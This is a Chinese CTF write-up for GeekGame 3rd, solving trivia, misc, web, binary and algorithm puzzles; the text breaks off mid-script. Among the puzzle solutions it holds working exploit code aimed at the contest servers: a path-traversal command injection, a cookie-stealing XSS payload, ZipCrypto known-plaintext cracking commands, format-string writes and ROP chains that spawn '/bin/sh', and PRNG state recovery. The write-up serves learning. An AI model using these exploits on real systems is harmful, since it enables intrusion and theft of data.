## GeekGame 3rd Writeup

#### 前言

​	今年第二次来玩 geekgame，学了一点 ics 之后感觉没像去年那么坐牢了。

​	尽管有些题差一点解出来，但结果也还算令人满意。

​	~~今年使用了屯题战术，给榜带来了一点奇观（~~

#### prob23-signin 一眼盯帧 [Tutorial]

​	逐帧获取字符然后凯撒解密即可。

​	不知道为什么我的 stegsolve 没用了，最后用的 Pr（大炮打蚊子.jpg）

#### prob18-trivia 小北问答 [Turtorial]

​	**#1**:

​		去高性能计算平台官网，找手册即可：https://hpc.pku.edu.cn/_book/guide/slurm/slurm.html

​	**#2**:

​		去 github 上找到小米对应机型的代码仓库：https://github.com/MiCode/Xiaomi_Kernel_OpenSource/tree/corot-t-oss

​		在 Makefile 文件中可以找到版本号：5.15.78

```
VERSION = 5
PATCHLEVEL = 15
SUBLEVEL = 78
```

​	**#3**:

​		在 google 上搜索 "apple" "model identifier" 之类的，最终找到一份比较全的表格：https://www.theiphonewiki.com/wiki/Models

​	**#4**: 在 github 上找到 guiding-star 的后端代码对应逻辑的部分：

```python
DISALLOWED_CHARS = (
        unicode_chars('Cc', 'Cf', 'Cs', 'Mc', 'Me', 'Mn', 'Zl', 'Zp') # control and modifier chars
        | {chr(c) for c in range(0x12423, 0x12431+1)} # too long
        | {chr(0x0d78)} # too long
    ) - EMOJI_CHARS
```

​	本地 python 跑一下就知道答案了，注意只能用 py3.8（3.9 和 3.10 都错了呜呜呜)

​	**#5**:

​		找了一下 https://web.archive.org/ 有保存过去网页的功能。

​		输入 bilibili.com，唉怎么不行？哦原来以前 b 站的网址是 bilibili.us，进去翻翻即得答案。

​	**#6**:

​		以 "启迪控股" "konza" "kacst" 为关键字在 google 搜索，发现一个很符合条件的会议：http://www.iaspbo.com.cn/contents/2/533

​		可知本次活动应该在卢森堡举行。

​		同时截取部分白色建筑，放入google识图，得到这是卢森堡爱乐音乐厅，之后就简单了。

<img src='./src/trivia/Luxembourg.png' width=75%>

​		PS: flag 和题目背景都是 LoveLive 相关！~~希望大家多多支持魔爪女孩！冇问题啦！~~

​	

#### prob15-service 猫咪状态监视器 [Misc]

​	呜呜呜，之前怎么试都不行，提示看源码之后就很明朗了，代码审计这块还是完全不熟练。

​	发现只有 `STATUS` 命令能让用户注入内容。

​	使用 `cat /usr/sbin/service` 获取 service 脚本内容，关注到这段主要的命令：

```shell
run_via_sysvinit() {
   # Otherwise, use the traditional sysvinit
   if [ -x "${SERVICEDIR}/${SERVICE}" ]; then
      exec env -i LANG="$LANG" LANGUAGE="$LANGUAGE" LC_CTYPE="$LC_CTYPE" LC_NUMERIC="$LC_NUMERIC" LC_TIME="$LC_TIME" LC_COLLATE="$LC_COLLATE" LC_MONETARY="$LC_MONETARY" LC_MESSAGES="$LC_MESSAGES" LC_PAPER="$LC_PAPER" LC_NAME="$LC_NAME" LC_ADDRESS="$LC_ADDRESS" LC_TELEPHONE="$LC_TELEPHONE" LC_MEASUREMENT="$LC_MEASUREMENT" LC_IDENTIFICATION="$LC_IDENTIFICATION" LC_ALL="$LC_ALL" PATH="$PATH" TERM="$TERM" "$SERVICEDIR/$SERVICE" ${ACTION} ${OPTIONS}
   else
      echo "${SERVICE}: unrecognized service" >&2
      exit 1
   fi
}
```

​	发现它不过就是一种包装起来调用程序的形式，那么直接调用 `cat flag.txt` 就行了呗。

​	但是注意到运行目录是在 `/etc/init.d` 下，那么用 `../../` 退回根目录即可，输入 `../../usr/bin/cat /flag.txt` 即得



#### prob24-password 基本功 [Misc]

​	**flag1:**

​		观察压缩包，里面有个莫名其妙的 chromedriver，同时压缩加密方式是 ZipCrypto, Store。

​		搜索了一下 ZipCrypto 的破解方法，其中明文攻击看起来很适用。

​		在 chromedriver 下载页面上寻找大小为 5.57M 的版本，最终得到版号为 89.0.4389.23。

​		使用 ARCHPR 小工具破解即可。

​	**flag2:**

​		又看了一眼明文攻击的内容，只需要 12 个字节的明文，且其中 8 个字节连续就能破解。

​		搜索一下 pcapng 的文件格式。

​		文件分为若干块，第一块为文件头（其中 x 表示文件头块的大小）：

​			`0A0D0D0Axxxxxxxx` `4D3C2B1A01000000` `FFFFFFFFFFFFFFFF`

​		这些信息对于明文攻击完全够用！使用 bkcrack 工具解决即可：

```
bkcrack -C challenge_2.zip -c flag2.pcapng -p plain2.txt -o 8 -x 0 0a0d0d0a
bkcrack -C challenge_2.zip -c flag2.pcapng -k 152ef3dd 9cb3e97d c3ad256d -d flag2.pcapng
```



#### prob16-darkroom Dark Room [Misc]

​	**flag1:**

​		先手玩一下，发现要在 sanity ≥ 117 时到达终点，正常游玩肯定是不行的。

​		发现有个操作 help 能够小概率提升 san 值，既然有概率，那么可以用大量尝试来通过。

```python
from pwn import *
import re

ip = "prob16.geekgame.pku.edu.cn"
port = 10016
token = b"9:How do you know my uid is 9"

instructions = [
    "newgame",
    "wwj",
    "y",
    "n","n","e","pickup key",
    "w","s","s","e","e","e","pickup trinket",
    "w","s","usewith key door",
    "s","s","n","w","w","w","n","pickup key",
    "s","e","e","e","n","n","w","w","n","n","w","w","usewith key door","use trinket"
]

while True:

    sleep(2.5)

    r = remote(ip, port)

    r.sendline(token)
    r.recv()

    for ins in instructions:
        r.sendline(ins.encode())
        r.recvuntil(b"]:")

    san = 0
    while san < 117:
        r.sendline(b"h")
        s = r.recvuntil(b"]:").decode()
        san = re.search("\((-?\d+)%\)",s)
        san = int(san.group(1))
        if san < 0:
            break
        print(san)
    
    if san > 0:
        break

r.interactive()
```



#### prob22-minecraft 麦恩·库拉夫特 [Misc]

​	**flag1:**

​		在矿洞里走走就看到了

​	**flag2:**

​		根据提示，我们需要找钻石块。都 flag2 了，想必要用程序找位置。

​		查了一下 mc 区域格式文件 mca，好像普通方块存储的时候会进行压缩，处理起来很麻烦。

​		但是包含额外信息的方块是储存在方块实体（BlockEntity）数据内的，提取比较方便。

​		因此我魔改了 https://github.com/Rapha149/MCWorldTools 中的代码，使其能够找到其他方块实体。

​		通过寻找告示牌（minecraft:sign）的位置，成功找到了 flag2

​	~~**flag3:** 我服了这谁写的提示，写了跟没写一样 /fn。能找到 flag3 位置的，能不知道这是红石模电？~~



#### prob14-emoji Emoji Wordle [Web]

​	**flag1:**

​		答案固定的话，直接爆服务器就行！

```python
import emoji_data, requests, re

a = emoji_data.EmojiSequence.items()
a = [e for (e, _) in a]
a = list(filter(lambda x:len(x)==1, a))
print(a)
s = set()

answer = ['?'] * 64

def query(s):
    url = f"https://prob14.geekgame.pku.edu.cn/level1?guess={s}"

    html = requests.get(url).content.decode()
    print(html)

    result = re.match(r'[\s\S]*push\("(.*)"\)[\s\S]*', html)
    result = result.group(1)

    print(s, result)
    return result

for p in range(0, len(a), 64):
    result = query(''.join(a[p:p+64]))

    for i, r in enumerate(result):
        if r == '🟨':
            s.add(a[p + i])

for c in s:
    result = query(c * 64)
    for i, r in enumerate(result):
        if (result[i] == '🟩'):
            answer[i] = c

print(''.join(answer))
```

​	**flag2: **

​		题目说了数据存在 SESSION 里，打开 SESSION 一看，base64 一解密，这不是答案吗？



#### prob01-homepage 第三新XSS [Web]

​	**flag1:**

​		阅读代码，发现程序把 flag 放在 /admin 路径下的 cookie，然后再获取自定义网页的 title。

​		查阅跨路径 cookie 相关资料，发现可以用 iframe 标签访问 /admin，以此取得 cookie。

​		payload 如下：

```html
<body>
<a>test</a>

<script>

xc=function(src){
 var o = document.createElement("iframe");
 o.src = src;
 document.getElementsByTagName("body")[0].appendChild(o);
 o.onload=function()
 {
     d=o.contentDocument||o.contentDocument.document;
     document.title=d.cookie;
 };
}("http://prob99-myuidis9.geekgame.pku.edu.cn/admin/");

</script>
</body>
```



#### prob13-easyts 简单的打字稿 [Web]

​	**flag1:**

​		翻了一下关于 TS 的资料，突然发现有一篇能用上：https://juejin.cn/post/6867538991073296392 

​		可以通过 type manipulation 把 flag1 中 'flag' 去除，从而通过报错来输出。

```typescript
type ReplaceOnce<Search extends string, Replace extends string, Subject extends string> =
    Subject extends `${infer L}${Search}${infer R}` ? `${L}${Replace}${R}` : Subject

type filtered = ReplaceOnce<"flag", "", flag1>;
const a : filtered = false;
```



#### prob25-krkr 汉化绿色版免费下载 [Binary]

​	**flag1:**

​		在判断两个字符串相等后，程序输出了 flag1，但是字体颜色与背景颜色一样。使用 Cheat Engine 搜索内存数据即可。

​	**flag2:**

​		~~呜呜，我为什么不听 flag1 的话去解包 xp3。[快哭了]~~

​		根据提示使用工具（我用的 crass）解包游戏数据。

​			1. 在 `round1.ks` 中可以发现程序是使用字符串 hash 判断两字符串是否相等。

​			2. 在 `data0.kdt` 中可以找到存档中字符串的 hash 值。

​			3. 在 `Config.tjs` 中发现一个自动记录的逻辑。

```text
// ◆ 自动记录已读文章
//选择是否自动记录已读的剧本标签。
//如果这个设定为true，则每次通过标签时都会给系统变量中的
//trail_剧本_剧本文件名_标签名
//这个变量的值+1
//比如first.ks中*start这个标签的话，对应的变量名称将是trail_first_start。
```

​			4. 在 `datasu.ksd` 中找到了对应的自动记录数据。

​		因此，得到字符串中含有 6 个 A，3 个 E，1 个 I，6 个 U，使用程序搜索即可。

```c++
#include <bits/stdc++.h>

std::string a = "AAAAAAEEEIOOOOOO";

const int mod = 19260817;

int get_offset(char c) {
    switch(c) {
        case 'A': return 11;
        case 'E': return 22;
        case 'I': return 33;
        case 'O': return 44;
        case 'U': return 55;
        case '}': return 66;
    }
    return -1;
}

int main() {
    do {
        int hash = 1337;
        for (char c : a) {
            hash = ((long long) hash * 13337 + get_offset(c)) % mod;
        }
        hash = ((long long) hash * 13337 + get_offset('}')) % mod;
        if (hash == 7748521) {
            std::cout << a << std::endl;
        }
    } while (std::next_permutation(a.begin(), a.end()));
    return 0;
}
```



#### prob09-easyc 初学 C 语言 [Binary]

​	**flag1:**

​		`checksec` 一下发现各项防御都开了。

​		观察代码，主要注入点是 `printf` 的格式化字符串。

​		程序读取文件，放到栈上的缓冲区，然而 x86-64 调用函数取第 6 个往后的参数会从栈里取，因此我们可以通过这种方式读取栈上数据。

```python
payload1 = "%d " * 5 + "%016llx," * 50

print(payload1)
```

​		再对读取到的数据进行解码：

```python
solve1 = [0x3445727b67616c66,0x66546e3172505f64,0x6f735f656430635f,0x000a7d597a34655f]
b = []
for ll in solve1:
    for p in range(8):
        b += [(ll >> (p * 8)) & 255]
print(bytes(b))
```



​	**flag2:**

​		希望使用 ROP 劫持系统的 shell，首先一个问题是怎么往栈上 return 地址写入值。

​		`printf` 有一个不常用的格式 `%n`，用处是把之前输出的字符数写入到对应参数（指针）指向的位置。

​		类似的有 `%lln`，`%hn`，`%hhn` 等，可以写入不同的大小。

​		因此我们可以把任意的地址塞进字符串里（现在这个地址在栈上），然后用这个方法把任意数值写入地址。

```python
def write_bytes(offset, data, absolute=False):
    rsp = get_rsp()
    for i, b in enumerate(data):
        print(f"debug: writing byte {i}, {b}")
        pos = offset + i
        if not absolute:
            pos += rsp + 0x4f0
        f = f'%{b}c%38$hhn' if b else '%38$hhn'
        f = f.encode()
        payload = f + b'\0' * (0x20 - len(f)) + p64(pos) # 此处把地址 pos 对齐到固定位置，方便 printf 调用
        print("payload: ", payload)
        p.sendline(payload)
        sleep(.05)
        p.recvuntil(b'instruction')
```

​		另外一个任务是获取 %rsp 的值，这样才能精确写入 return 地址。

​		发现代码中的 publics 字符串是在栈上的，同时 publics 也作为 printf 的第二参数，直接使用 %p 即可输出 %rsp（带点偏移）。

```python
def get_rsp():
    p.sendline(b"(((%p)))")
    sleep(.05)
    ret = find_hex(p.recvuntil(b"instruction")) - 0x60
    print(f"found rsp: {hex(ret)}")
    return ret
```

​		然而程序中没有 system 函数和 "/bin/sh" 字符串。提示给出的文档指出可以使用 ret2syscall。

​		由于程序开启了 PIE 防护，我们还得找到程序的基址，这样才能利用各个 gadget。我使用栈上返回 __libc_start_main 函数的地址，取得程序基址。

```python
p1 = b'%167$p'
p.recvuntil(b"instruction")
p.sendline(p1)

ret = p.recvuntil(b"instruction")
ret = find_hex(ret)

base_addr = ret - 0xAC20
```

​		syscall (0F 05) 指令的作用是，调用系统操作如 read, write, execve 等，这里就希望使用 execve("/bin/sh", 0, 0) 来劫持进程。

​		根据文档 https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit，我们需要使 %rax=0x3b；%rdi="/bin/sh"；%rsi=0；%rdx=0，修改这些寄存器的值，可以简单通过 pop 指令实现，只需要在程序中找到相应 gadget 即可。其中字符串可以往栈前面随便一个位置写入。

```python
rsp = get_rsp()
binsh_pos = rsp + 0x1000
write_bytes(binsh_pos, b"/bin/sh\0", absolute=True)

pop_rax = base_addr + 0x5a777	# pop %rax; ret
pop_rdi = base_addr + 0x9cd2	# pop %rdi; ret
pop_rsi = base_addr + 0x1781e	# pop %rsi; ret
pop_rdx = base_addr + 0x9bdf	# pop %rdx; ret
syscall = base_addr + 0x9643	# syscall

write_bytes(8, 
            p64(pop_rax)
        +   p64(0x3b)
        +   p64(pop_rdi)
        +   p64(binsh_pos)
        +   p64(pop_rdx)
        +   p64(0)
        +   p64(pop_rsi)
        +   p64(0)
        +   p64(syscall)
)

retback()

p.interactive()
```

​		完整 EXP 见 `./src/easyc/solve2.py`。



#### prob10-babystack Baby Stack [Binary]

​	**flag1:**

​		checksec 一下，PIE 和 Canary 都没开。

​		没给源码，IDA 看看先。

​		发现 readline 的时候，用了 `(unsigned)l - 1 <= i`的方法，使 `l = 0`，无符号数的溢出使判断无效。

​		接着就用简单的 ROP 跳转到给定的 `backdoor`函数。

```python
from pwn import *

ip = "prob10.geekgame.pku.edu.cn"
token = b"9:How do you know my uid is 9"
port = 10010

r = remote(ip, port)
r.sendline(token)

backdoor_addr = 0x4011b6
ret_addr = 0x40136c

payload = b'0\n' + b"A" * 120 + p64(ret_addr) + p64(backdoor_addr)

print(r.recv())
r.sendline(payload)

r.interactive()
```

​	**flag2:**

​		沿用和上一题一样的思路，在 printf 的格式化字符串上做文章。

​		首先一个难点是 scanf, printf 遇到 \0 就截断（64 位程序指针一般都有一个 0 字节），加上程序只运行一次，非常不方便注入。

​		因此考虑每次运行都把 main 函数 return 的地址改为 main，让其再运行一次。

​		这样发现了一个小问题，就是有些操作需要 %rsp 16 对齐，我的办法是跳转到 main+6 的位置（少 pop 一个数）。

​		接下来就是如何写数据了，每次运行 main 有三次读入，

​		我采用的办法是：第一次读入给出地址，第二次读入往该地址写入值，第三次读入修改 return 地址。

```python
def inject_start(payload1, payload2, payload3=b"bye", return_pos = main + 0x6, return_to_main=False, first_time=False):
    print(payload1, payload2, payload3)
    p.sendline(payload1)
    sleep(.05)
    p.sendline(payload2)
    sleep(.05)
    padding = 0x38
    if return_to_main:
        assert len(payload3) <= padding
        payload3 = payload3 + b"A" * (padding - len(payload3))
        payload3 = payload3 + p64(return_pos)
    p.sendline(payload3)
    sleep(.05)
    res = p.recvuntil(b'luck~:)')
    print(res)
    return res

for i, byte in enumerate(writing_bytes):
    if (byte == 0):
        f = f'%14$hhn'
    else:
        f = f'%{byte}c%14$hhn'
    inject_start(p64(start_pos + i), f.encode(), return_to_main=True)
    print(f"number: {i}")
```

​		由于 libc 开了 PIE，还是使用类似的方法，通过 __libc_start_main 找到 libc 的基址，调用 libc 中的 system("/bin/sh")

```python
writing_bytes = (
    [(ret_addr     >> (8 * i)) & 255 for i in range(8)] +	# 为了 %rsp 16 对齐
    [(pop_rdi_addr >> (8 * i)) & 255 for i in range(8)] +
    [(binsh_addr   >> (8 * i)) & 255 for i in range(8)] +
    [(system_addr  >> (8 * i)) & 255 for i in range(8)]
)
```

​		还有一个细节是写入位置，每次 return main 后 rsp 会减去 0x10，写入地址要恰好在对应位置。我是用的 gdb 先看一下写入完后的偏移。

​		完整 EXP 见 `./src/babystack/c2.py`。



#### prob20-polynomial 绝妙的多项式 [Binary]

​		怎么感觉这题应该归到 Algo 里面去（

​	**flag1:**

​		IDA 看一下，发现里面有一个 mint 类实现了模 998244353 的整数运算。

​		阅读 flag1 对应的 sub_1803()，发现实际上在做一个多项式求值，在数据段给出了 1~36 的点值。

​		随便插值一下就行（因为一开始没看到模数，所以用的高斯消元，实际上有更好的方法比如 Lagrange 插值）

```python
data = [0x0CF6, 0x16C80709, 0x86B7BDA, 0x5FBEE9E, 0x24D1FFC1, 0x16F76AE2, 0x15F03305, 0x218C23F9, 0x33163AC1, 0x332C16E, 0x27E7B4A7, 0x241D8073, 0x1C6F122, 0x2D73DE13, 0x7FC0A09, 0x0D50F7B7, 0x261B1DD, 0x37E5BB8E, 0x0DA71DC5, 0x2DC3F20C, 0x0CCB13A, 0x2F6341E4, 0x0B0611DB, 0x0A382A1A, 0x103C09B2, 0x1CE2BE88, 0x19A9FD15, 0x2621CFC1, 0x2970DEAC, 0x8A463AA, 0x116C6D31, 0x222E9178, 0x33B9C9DD, 0x2F98D035, 0x0B8177A, 0x342611E8]

mod = 998244353
n = 36

matrix = [[0] * (n + 1) for i in range(n)]

def swap(i, j):
    for k in range(n + 1):
        matrix[i][k], matrix[j][k] = matrix[j][k], matrix[i][k]
def add(i, k, j):
    for p in range(n + 1):
        matrix[i][p] = (matrix[i][p] + k * matrix[j][p]) % mod

for i in range(n):
    matrix[i][n] = data[i]
    for j in range(n):
        matrix[i][j] = (i + 1) ** j % mod

for i in range(n):
    for j in range(i + 1, n):
        if (matrix[j][i]):
            swap(i, j)
            while (matrix[j][i]):
                add(i, -(matrix[i][i] // matrix[j][i]), j)
                swap(i, j)
                
s = ""
for i in range(n - 1, -1, -1):
    for c in range(32, 127):
        if (matrix[i][i] * c % mod == matrix[i][n]):
            ans = c
            s += chr(c)
            break
    
    for j in range(i):
        matrix[j][n] = (matrix[j][n] - ans * matrix[j][i]) % mod

print(s[::-1])
```

​	**flag2:**

​		进入 flag2 对应的 sub1AAE()，发现把字符串长度补齐到 2 的幂次，然后调用 sub_14BE()。

​		点进去 sub_14BE() 之后，学过算法竞赛的应该很熟悉这段代码，这是多项式运算重要的操作 FFT（Fast Fourier Transform）。

​		推测数组 dword_405280[] 中应该存储的是单位根，在 sub_1309() 中可以发现是使用的常用原根 3 来生成的单位根。

​		那么只要对数据进行一次 FFT 的逆变换即可。

```python
data = [0x0F49, 0x121, 0x31C44DFF, 0x9BBB244, 0x9CD2637, 0x99E9344, 0x3A1174D9, 0x2982CE42, 0x202A3E59, 0x3AD2F444, 0x655DAC3, 0x181AE6C1, 0x2FFCF1EE, 0x0AAE9419, 0x2016E6F4, 0x19CF9F98, 0x2DEA04C3, 0x89262F4, 0x18327C16, 0x373BD1D9, 0x938E62A, 0x36B7868B, 0x3813BCFE, 0x0D213F8D, 0x7E67F22, 0x38FCD76, 0x32A17A7E, 0x2386EE67, 0x382D9FD7, 0x2FA45664, 0x4CFE37E, 0x2AF595C, 0x2103E392, 0x1536B2BA, 0x1C46D639, 0x0B170DEB, 0x2104AB3D, 0x334666E4, 0x0D52FFE1, 0x144A6446, 0x242BCC46, 0x37BF7317, 0x3A97D9A, 0x3B329D1A, 0x724F983, 0x1ED8A93E, 0x25E09BB8, 0x18121D9E, 0x2E301013, 0x105E3542, 0x375ADF03, 0x51674FE, 0x2AC2758E, 0x352291E2, 0x375D7604, 0x338E6B2A, 0x0C8EB7EB, 0x2F5350DC, 0x20E81988, 0x35F5C18E, 0x8753392, 0x0CD0ACE9, 0x17DF5455, 0x1B91C2B0]

n = 64
mod = 998244353

invn = pow(n, mod - 2, mod)
w = pow(3, (mod - 1) // n, mod)

wn = [0] * n
wn[n // 2] = 1
for i in range(n // 2 + 1, n):
    wn[i] = wn[i - 1] * w % mod
for i in range(n // 2 - 1, 0, -1):
    wn[i] = wn[i * 2]


mid = 1
while (mid < n):
    for i in range(0, n, mid * 2):
        for j in range(0, mid):
            x, y = data[i + j], data[i + j + mid] * wn[j + mid] % mod
            data[i + j], data[i + j + mid] = (x + y) % mod, (x - y) % mod
    mid <<= 1

if (idft := 1):
    for i in range(1, n // 2):
        data[i], data[n - i] = data[n - i], data[i]
    for i in range(0, n):
        data[i] = data[i] * invn % mod

print(bytes(data))
```

​	**flag3:**

​		既然知道 sub_14BE() 是 FFT，很明显 sub_1627() 就是 FFT 逆变换，代码实际上是在做一个多项式乘法（但是截取了前 64 项）

​		但是由于 FFT 时长度是 128，没有发生溢出，因此还是能用多项式求逆还原出数据的。

```python
welcome = [0x77, 0x65, 0x6C, 0x63, 0x6F, 0x6D, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x74, 0x68, 0x65, 0x20, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x20, 0x6F, 0x66, 0x20, 0x70, 0x6F, 0x6C, 0x79, 0x6E, 0x6F, 0x6D, 0x69, 0x61, 0x6C]

result = [0x2F6A, 0x5A72, 0x82BB, 0x0AB28, 0x0E0BA, 0x10431, 0x12D48, 0x13BA4, 0x1680F, 0x19B4C, 0x1A7C3, 0x1CF0C, 0x20372, 0x22B61, 0x21699, 0x25383, 0x26220, 0x2937A, 0x2ABFB, 0x2DC98, 0x2D6B3, 0x31C9D, 0x34098, 0x34EBC, 0x36C65, 0x3A27D, 0x3C317, 0x3DC21, 0x42900, 0x42A20, 0x46CA4, 0x47612, 0x49A6E, 0x4B259, 0x50845, 0x50666, 0x545CE, 0x55420, 0x5A3DE, 0x5C550, 0x5B2E2, 0x596FC, 0x59395, 0x5A07C, 0x57CF8, 0x57E0A, 0x57CBD, 0x5ADF7, 0x56512, 0x5872F, 0x58E27, 0x5AD27, 0x5936F, 0x594E2, 0x599BD, 0x5AA89, 0x5991C, 0x579AC, 0x573B4, 0x57A8B, 0x5A9EE, 0x58ACC, 0x5ABA2, 0x5B498]

answer = []

n = 64

for i in range(len(welcome), len(result)):
    welcome += [welcome[i % 34]]

for i in range(n):
    ans = result[i]
    for j in range(i):
        ans -= answer[j] * welcome[i - j]
    assert(ans % welcome[0] == 0)
    answer += [ans // welcome[0]]

print(bytes(answer))
```



#### prob04-filtered 关键词过滤喵，谢谢喵 [Algorithm喵]

​		阅读题目，发现这其实是一种 esolang，需要我们写几段对应程序喵。

​		由于有条件跳转和标签之类的，可以很容易实现函数的功能（就像汇编一样）喵。

​		因为之前玩过类似的游戏 A=B，所以这题做起来也很顺畅喵。

​	**flag1喵:**

​		可以在字符串结尾放入一个特殊字符用来分割输入与输出喵。

​		每次循环从开头删一个字符，并对输出 +1 喵。

​		+1 操作可以模拟一个进位的指针，碰到 0-8 直接替换加上去，碰到 9 改成 0 并前进一位喵。

```plain
    把【\Z】替换成【😡0】喵

循环：
    如果看到【\A😡】就跳转到【退出循环】喵

加一：
    把【\A[\s\S]】替换成【】喵
    把【\Z】替换成【😋】喵
    重复把【9😋】替换成【😋0】喵
    把【0😋】替换成【1】喵
    把【1😋】替换成【2】喵
    把【2😋】替换成【3】喵
    把【3😋】替换成【4】喵
    把【4😋】替换成【5】喵
    把【5😋】替换成【6】喵
    把【6😋】替换成【7】喵
    把【7😋】替换成【8】喵
    把【8😋】替换成【9】喵
    把【😡😋】替换成【😡1】喵

    如果看到【😡】就跳转到【循环】喵

退出循环：
    把【😡】替换成【】喵

    谢谢喵
```

​		注意输入可能有换行，不能用 . 而要用 [\s\S] 之类的喵。

​	**flag2喵:**

​		对长度进行排序，可以给每个字符串设置头尾指针喵。

​		每次循环移动一次头指针，如果两个指针相遇，说明这个字符串比较短喵，就把它放到最后去喵。

​		这样结果就是从小到大排序了喵。

```plain
    把【\n】替换成【😡\n😋】喵
    把【^】替换成【\n😋】喵
    把【$】替换成【😡\n】喵

循环：

    如果没看到【😋】就跳转到【跳出循环】喵

    重复把【\n([^\n]*)😋😡\n([\s\S]*)\Z】替换成【\n\2\n\1】喵

    把【😋(.)】替换成【\1😋】喵

    如果看到【[\s\S]】就跳转到【循环】喵

跳出循环：

    谢谢喵
```

​		这边有个小细节喵，我把开头结尾都放上了一个 \n 方便处理喵。

​	**flag3喵：**

​		居然要写一个 brainfuck 解释器喵。

​		首先要设计好 brainfuck 运行时的字符串结构喵：

​		我用的是 *[输出字符序列] **#** [BF 程序（其中含有程序指针）] **#** [“栈”（用来记录 [] 嵌套数量）] **#** [模拟纸带（含有当前内存指针）]* 喵。

​		然后根据程序指针右侧字符判断处理喵。

​			`+/-` ：对内存指针附近的值进行修改喵，修改方法和 flag1 一样喵（我为了方便使用 2 进制了喵）。

​			`<>`：移动内存指针喵，如果移出纸带，还需要额外扩展纸带喵。

​			`[`：若内存指针指向 0 就跳转到对应的 `]`右边喵，否则正常移动程序指针喵。

​			`]`：跳转到对应的 `[` 左边喵。

​			`.`：逐个判断内存指针的可能值，并写入输出喵。

```plain
字符串结构：output💙[inst. pointer🟠]program🧡[stack🟡][tape splitted by 💚][data pointer🟢] 喵

stack用于循环体的回调喵
data pointer位于所指数据的右侧喵

初始化：
    把【\n】替换成【】喵
    把【^】替换成【💙🟠】喵
    把【$】替换成【🧡0🟢】喵

执行命令：
    如果看到【🟠🧡】就跳转到【程序结束】喵
    如果看到【🟠>】就跳转到【指针右移】喵
    如果看到【🟠<】就跳转到【指针左移】喵
    如果看到【🟠\+】就跳转到【加一】喵
    如果看到【🟠-】就跳转到【减一】喵
    如果看到【🟠\.】就跳转到【输出】喵
    如果看到【🟠\[】就跳转到【开始循环体】喵
    如果看到【🟠\]】就跳转到【结束循环体】喵

    把【🟠(.)】替换成【\1🟠】喵

    如果看到【.】就跳转到【执行命令】喵

指针右移：
    把【🟠(.)】替换成【\1🟠】喵
右移：
    如果没看到【🟢💚】就跳转到【纸带右扩】喵
    把【🟢(💚\d+)([^\d]|$)】替换成【\1🟢\2】喵
    如果看到【.】就跳转到【执行命令】喵
纸带右扩：
    把【$】替换成【💚0】喵
    如果看到【.】就跳转到【右移】喵

指针左移：
    把【🟠(.)】替换成【\1🟠】喵
左移：
    如果没看到【💚\d+🟢】就跳转到【纸带左扩】喵
    把【(💚\d+)🟢】替换成【🟢\1】喵
    如果看到【.】就跳转到【执行命令】喵
纸带左扩：
    把【🧡】替换成【🧡0💚】喵
    如果看到【.】就跳转到【左移】喵

加一：
    把【🟠(.)】替换成【\1🟠】喵
    把【🟢】替换成【🟩🟢】喵
    重复把【1🟩】替换成【🟩0】喵
    把【0🟩】替换成【1】喵
    把【🟩】替换成【1】喵
    如果看到【.】就跳转到【执行命令】喵

减一：
    把【🟠(.)】替换成【\1🟠】喵
    把【🟢】替换成【🟩🟢】喵
    重复把【0🟩】替换成【🟩1】喵
    把【1🟩】替换成【0】喵
    把【([^\d])0+(1\d*🟢)】替换成【\1\2】喵
    如果看到【.】就跳转到【执行命令】喵

开始循环体：
    把【🟠(.)】替换成【\1🟠】喵
    如果看到【[^\d]0🟢】就跳转到【结束循环】喵
    如果看到【.】就跳转到【执行命令】喵
结束循环：
    把【🟠([^\[\]]+)】替换成【\1🟠】喵
    把【🟠\[(.*)🧡】替换成【[🟠\1🧡🟡】喵
    如果没看到【🟠\]】就跳转到【结束循环】喵
    如果没看到【🟡】就跳转到【已回到尾部】喵
    把【🟠\](.*)🟡】替换成【]🟠\1】喵
    如果看到【.】就跳转到【结束循环】喵
已回到尾部：
    把【🟠\]】替换成【]🟠】喵
    如果看到【.】就跳转到【执行命令】喵


结束循环体：
    把【([^\[\]]+)🟠】替换成【🟠\1】喵
    把【\]🟠(.*)🧡】替换成【🟠]\1🧡🟡】喵
    如果没看到【\[🟠】就跳转到【结束循环体】喵
    如果没看到【🟡】就跳转到【已回到头部】喵
    把【\[🟠(.*)🟡】替换成【🟠[\1】喵
    如果看到【.】就跳转到【结束循环体】喵
已回到头部：
    把【\[🟠】替换成【🟠[】喵
    如果看到【.】就跳转到【执行命令】喵


输出：
    把【🟠(.)】替换成【\1🟠】喵
    把【(💙.*[^\d]100000🟢.*)$】替换成【 \1】喵
    把【(💙.*[^\d]100001🟢.*)$】替换成【!\1】喵
	……
	此处省略 114514 行喵
	……
    把【(💙.*[^\d]1111010🟢.*)$】替换成【z\1】喵
    如果看到【.】就跳转到【执行命令】喵



程序结束：
    把【💙.*$】替换成【】喵
    谢谢喵
```



#### prob08-cookie 小章鱼的曲奇 [Algorithm]

​		全场最奇异搞笑的题，没有之一。

​	**flag1:**

​		给出了 python randbytes 生成的前 2500 个字节，需要预测接下来的数据。

​		查了一下，使用 randcrack 包可以实现该功能，只需要提交 624 个 32 位整数（2496 字节）即可预测随机数。

```python
from random import Random
from randcrack import RandCrack

rc = RandCrack()

with open("password1.txt", "r") as f:
    password = f.read()

for i in range(624):
    dword = password[i * 8: (i + 1) * 8]
    int32 = dword[6:8]+dword[4:6]+dword[2:4]+dword[0:2]
    int32 = int(int32, 16)
    rc.submit(int32)

stream = password[:624 * 8]
while (len(stream) < len(password)):
    int32 = rc.predict_getrandbits(32)
    int32 = '{:08x}'.format(int32)
    stream += int32[6:8]+int32[4:6]+int32[2:4]+int32[0:2]

print(len(password))

b = []
for i in range(5000, len(password), 2):
    byte = int(password[i:i+2],16) ^ int(stream[i:i+2],16)
    b += [byte]

print(bytes(b))
```

​	**flag2:**

​		发现它把 void1, void2 整体生成了若干个字节，我本来的想法是枚举这个生成的次数，然后预测。

​		结果发现不管提前生成多少都能成功预测，可能是种子与生成的随机数有一种同态的关系（

```python
from random import Random
from randcrack import RandCrack

with open("password2.txt", "r") as f:
    seed1, seed2, praw = f.read().split()

void1 = Random(int(seed1, 16))
void2 = Random(int(seed2, 16))

password = b''
for i in range(0, len(praw), 2):
    password += int(praw[i:i+2], 16).to_bytes(length=1,byteorder='little')

print(password)

gen = []
n = (1 << 22) + 6000

A = void1.randbytes(n)
B = void2.randbytes(n)

C = [x ^ y for x, y in zip(A, B)]

answer = b''

for start in range(0, (1 << 22) + 1, 1):
    if (start % 1000 == 0):
        print("now: ", start)
    rc = RandCrack()
    for p in range(0, 2496, 4):
